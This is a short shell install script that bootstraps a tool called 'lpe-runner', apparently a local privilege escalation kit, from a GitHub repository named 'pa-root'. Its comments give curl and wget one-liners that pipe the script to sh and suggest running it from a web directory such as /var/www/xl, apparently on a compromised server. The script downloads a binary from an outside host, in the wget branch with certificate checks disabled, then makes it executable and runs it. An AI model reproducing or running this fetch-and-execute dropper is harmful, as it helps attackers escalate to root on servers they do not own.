#!/bin/sh
# install.sh - one-shot bootstrap for lpe-runner.
#
# Everything runs in the CURRENT directory (wherever you ran the command).
# No /tmp, no probing. If you're in /var/www/xl, that's where it all happens.
#
# Usage (one line):
#   curl -sL https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# Or if curl is missing:
#   wget -qO- https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# Detach stdin from the pipe so $() substitutions don't eat the script.

set -e
exec 0</dev/null

REPO="https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main"
BIN="lpe-runner"
DIR="$(pwd)"

echo "[*] Working directory: $DIR"

if command -v curl >/dev/null 2>&1; then
    curl -sL --retry 3 -o "$BIN" "$REPO/lpe-runner/$BIN"
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -O "$BIN" "$REPO/lpe-runner/$BIN"
else
    echo "[-] Need curl or wget." >&2
    exit 1
fi

chmod +x "$BIN"

if [ ! -s "$BIN" ]; then
    echo "[-] Download failed (empty file)." >&2
    exit 1
fi

echo "[+] lpe-runner ready: $DIR/$BIN"
echo "    Size: $(wc -c < "$BIN") bytes"
echo
echo "[*] Starting lpe-runner (auto-fetch enabled) ..."
echo "    All files fetched into: $DIR"
echo

./"$BIN" "$@"
